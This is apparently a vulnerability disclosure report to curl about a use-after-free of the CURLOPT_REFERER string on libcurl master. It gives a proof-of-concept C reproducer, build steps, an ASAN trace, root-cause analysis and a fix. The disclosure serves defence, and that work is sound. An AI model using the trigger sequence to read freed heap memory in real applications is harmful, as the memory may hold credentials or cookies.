  "vulnerability_information": "Calling `curl_easy_setopt(curl, CURLOPT_REFERER, ...)` to replace or clear a previously-set referer after `curl_easy_perform()` frees the old string via `Curl_setstropt` (lib/setopt.c:87) but leaves `data->state.referer.ptr` pointing at the freed heap region. `curl_easy_getinfo(CURLINFO_REFERER)` and `curl_easy_duphandle()` then read through the dangling pointer. ASAN catches all three vectors reliably. Read-only, in-process UAF - the leaked bytes do NOT reach the wire.\n\nThis is an incomplete-fix variant of #21741. The 2026-05-25 fix `862e8a74a` covers the next-perform window (clears `state.referer` in `Curl_pretransfer` when set to NULL), but does not cover the getinfo and duphandle paths between setopt and the next perform, and does not handle replacement (non-NULL to non-NULL) at all.\n\nThe regression was introduced by `fa057ea3d` (2026-04-15) which switched `state.referer` to a `bufref` aliasing `set.str[STRING_SET_REFERER]` without a setopt mirror. No released version is affected - 8.20.0 predates `fa057ea3d`.\n\n## Affected version\n\nTested on master HEAD `872c313d7` (2026-06-01). The relevant sites (`lib/transfer.c:511-513`, `lib/setopt.c:2027`, `lib/easy.c:1022-1027`, `lib/getinfo.c:145`) are unchanged since `fa057ea3d`.\n\n```bash\ncurl 8.14.0-DEV (x86_64-pc-linux-gnu) libcurl/8.14.0-DEV OpenSSL/3.5.0 zlib/1.3.1\nBuilt with ASAN+UBSan: -fsanitize=address,undefined -O0 -g\n```\n\n## Steps To Reproduce\n\nBuild curl master with ASAN:\n\n```bash\ngit clone https://github.com/curl/curl.git && cd curl\ncmake -S . -B build \\\n  -DCMAKE_BUILD_TYPE=Debug \\\n  -DCMAKE_C_FLAGS=\"-fsanitize=address,undefined -fno-omit-frame-pointer -g -O0\" \\\n  -DCMAKE_EXE_LINKER_FLAGS=\"-fsanitize=address,undefined\" \\\n  -DCMAKE_SHARED_LINKER_FLAGS=\"-fsanitize=address,undefined\" \\\n  -DCURL_USE_OPENSSL=ON -DBUILD_SHARED_LIBS=ON \\\n  -DBUILD_TESTING=OFF -DBUILD_CURL_EXE=OFF\ncmake --build build -j --target libcurl_shared\n```\n\n**Vector 1 - getinfo after replacement** (uaf_referer.c):\n\n```c\n#include <curl/curl.h>\n#include <stdio.h>\n#include <string.h>\nstatic size_t devnull(void *p, size_t s, size_t n, void *u){(void)p;(void)u;return s*n;}\nint main(void){\n    CURL *curl; const char *ref = NULL;\n    curl_global_init(CURL_GLOBAL_DEFAULT);\n    curl = curl_easy_init();\n    curl_easy_setopt(curl, CURLOPT_URL, \"file:///dev/null\");\n    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, devnull);\n    curl_easy_setopt(curl, CURLOPT_REFERER, \"http://example.com/secret-A\");\n    curl_easy_perform(curl);\n    /* frees old copy; state.referer dangles */\n    curl_easy_setopt(curl, CURLOPT_REFERER, \"http://example.com/B\");\n    curl_easy_getinfo(curl, CURLINFO_REFERER, &ref);\n    if(ref) printf(\"strlen=%zu\\n\", strlen(ref)); /* UAF read */\n    curl_easy_cleanup(curl);\n    curl_global_cleanup();\n}\n```\n\n```bash\ngcc -O0 -g -fsanitize=address,undefined uaf_referer.c \\\n    -Iinclude -Lbuild/lib -lcurl-d -Wl,-rpath,build/lib -o uaf_referer\nASAN_OPTIONS=detect_leaks=0 ./uaf_referer\n```\n\nASAN output:\n\n```bash\n==PID==ERROR: AddressSanitizer: heap-use-after-free on address ...\nREAD of size 2 ... thread T0\n    #0 strlen\n    #1 main uaf_referer.c:...\nfreed by thread T0 here:\n    #1 Curl_setstropt lib/setopt.c:87\n    #2 setopt_cptr lib/setopt.c:2027\npreviously allocated by thread T0 here:\n    #1 Curl_setstropt lib/setopt.c:93\n```\n\n**Vector 2 - getinfo after setopt to NULL** (uaf_referer_null.c): Same flow but the replacement is `NULL`. The 2026-05-25 fix clears `state.referer` in the next `Curl_pretransfer`, but `getinfo` between setopt and perform still UAFs. ASAN trace attached.\n\n**Vector 3 - duphandle after replacement** (uaf_referer_dup.c):\n\n```c\ncurl_easy_setopt(curl, CURLOPT_REFERER, \"http://example.com/secret-A\");\ncurl_easy_perform(curl);\ncurl_easy_setopt(curl, CURLOPT_REFERER, \"http://example.com/B\");\nCURL *dup = curl_easy_duphandle(curl); /* strdup on dangling ptr */\n```\n\n`curl_easy_duphandle` calls `Curl_bufref_dup` (lib/easy.c:1024) which runs `strdup()` on the dangling pointer - ASAN catches this as a heap-use-after-free read.\n\nNote: the leaked bytes do NOT reach the wire. The dup handle's next `curl_easy_perform()` re-aliases `state.referer` from `set.str[STRING_SET_REFERER]` in `Curl_pretransfer` (lib/transfer.c:511-515) before the `Referer:` header builder (lib/http.c:2941) runs. Verified empirically with a localhost listener: the dup handle transmitted the current referer, not the freed bytes.\n\n**Root cause:** `CURLOPT_URL` at lib/setopt.c:2202-2208 mirrors the setopt into `state.url` via `Curl_bufref_set`. `CURLOPT_REFERER` at lib/setopt.c:2027 does not have this mirror - the asymmetry is the bug.\n\n**Suggested fix:** Mirror `CURLOPT_REFERER` setopt into `state.referer` (matching the `CURLOPT_URL` pattern), or change `Curl_bufref_set` in `lib/transfer.c:512` to `Curl_bufref_memdup0` so `state.referer` owns its own copy.\n\n## Again: there is no bug-bounty for curl. We do not offer any rewards, only proper credits.\n\nUnderstood. Submitting for CVE assignment and credit.\n\n## Impact\n\n- Read-only, in-process heap-use-after-free of the freed referer string. The read may land on another live allocation (credentials, headers, cookies) depending on heap reuse.\n- Vectors 1+2: the dangling pointer is returned to the application via `CURLINFO_REFERER`. The docs guarantee this pointer is valid until `curl_easy_cleanup` - the UAF violates that documented contract. Any application that dereferences, logs, or copies the returned value reads freed heap.\n- Vector 3: `curl_easy_duphandle()` strdup's the dangling pointer (the UAF read itself). The leaked bytes land in the dup handle's `state.referer` but are overwritten by `Curl_pretransfer` before any network I/O - so this is an in-process UAF read only, same impact class as vectors 1+2.\n- No released version is affected - `fa057ea3d` (2026-04-15) introduced the regression post-8.20.0.",
